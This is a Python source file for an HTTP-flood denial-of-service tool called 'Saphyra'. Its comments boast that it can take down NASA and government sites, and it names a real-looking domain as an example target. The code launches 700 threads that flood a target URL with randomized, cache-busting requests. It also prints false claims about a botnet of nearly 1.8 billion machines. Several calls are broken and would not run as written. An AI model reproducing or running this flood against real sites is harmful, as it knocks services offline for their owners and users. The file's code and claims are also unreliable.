# ----------------------------------------------------------------------------------------------
# Saphyra - DDoS Tool
#
# The DDoS Protocol is the most massive type of attack
# This tool can tangodown nasa and more gov websites
# 
#
# author : Anonymous , version 1.1
# Upgraded to python3 by ChronoX
# ----------------------------------------------------------------------------------------------

import urllib, sys, threading, random, re # original : urllib2
from headers_referers import referer_list
from headers_useragents import useragent_list

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
    global request_counter
    request_counter+=9999

def set_flag(val):
    global flag
    flag=val

def set_safe():
    global safe
    safe=1
    
# the method useragent_list generates a user agent array
# the method referer_list generates a referer array
  
#builds random ascii string
def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 160)
        out_str += chr(a)
    return(out_str)

def usage():
    print('Saphyra DDoS Tool (individual Dangerous Denial of Service)')
    print('New loaded Botnets: 1,798,445,657')
    print('Usage: Saphyra (url)')
    print('Example: Saphyra.py http://luthi.co.il/')
    print("\a")
print(\
"""
                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /  
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/    
                   *-/*-._* `. 
                    /     *-.'._
                   /\       /-._*-._
    _,---...__    /  ) _,-*/    *-(_)
___<__(|) _   **-/  / /   /
 '  `----' **-.   \/ /   /
               )  ] /   /
       ____..-'   //   /                       )
   ,-**      __.,'/   /   ___                 /,
  /    ,--**/  / /   /,-**   ***-.          ,'/
 [    (    /  / /   /  ,.---,_   `._   _,-','
  \    `-./  / /   /  /       `-._  *** ,-'
   `-._  /  / /   /_,'            **--*
       */  / /   /*         
       /  / /   /
      /  / /   /  
     /  |,'   /  
    :   /    /
    [  /   ,'     ~>Saphyra DDoS Tool<~
    | /  ,'      ~~>Created By Anonymous<~~
    |/,-'       ~~~>Updated By ChronoX<~~~
    '
                                                       
""")

    
#http request
def httpcall(url):
    useragent_list()
    referer_list()
    code=0
    if url.count("?")>0:
        param_joiner="&"
    else:
        param_joiner="?"
    request = urllib.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
    request.add_header('Keep-Alive', random.randint(110,160))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host',host)
    try:
        urllib.urlopen(request)
    except urllib.HTTPError: # original: except urllib2.HTTPError, e:
        #print e.code
        set_flag(1)
        print("----->>> ! We are Anonymous - ExpectUS ! <<<-----")
        code=500
    except urllib.URLError: # original: except urllib2.URLError, e:
        #print e.reason
        sys.exit()
    else:
        inc_counter()
        urllib.urlopen(request)
    return(code)            

    
#http caller thread 
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag<2:
                code=httpcall(url)
                if (code==500) & (safe==1):
                    set_flag(2)
        except Exception: #original: execpt Exeption, ex:
            pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous=request_counter
        while flag==0:
            if (previous+100<request_counter) & (previous!=request_counter):
                previous=request_counter
        if flag==2:
            print("\n-- Sending mass amounf of packets generated by Liphyra Botnet --")

#execute 
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1]=="help":
        usage()
        sys.exit()
    else:
        print("Starting the Attack")
        print("ANONYMOUS")
        if len(sys.argv)== 3:
            if sys.argv[2]=="safe":
                set_safe()
        url = sys.argv[1]
        if url.count("/")==2:
            url = url + "/"
        m = re.search('http\://([^/]*)/?.*', url)
        host = m.group(1)
        for i in range(700):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
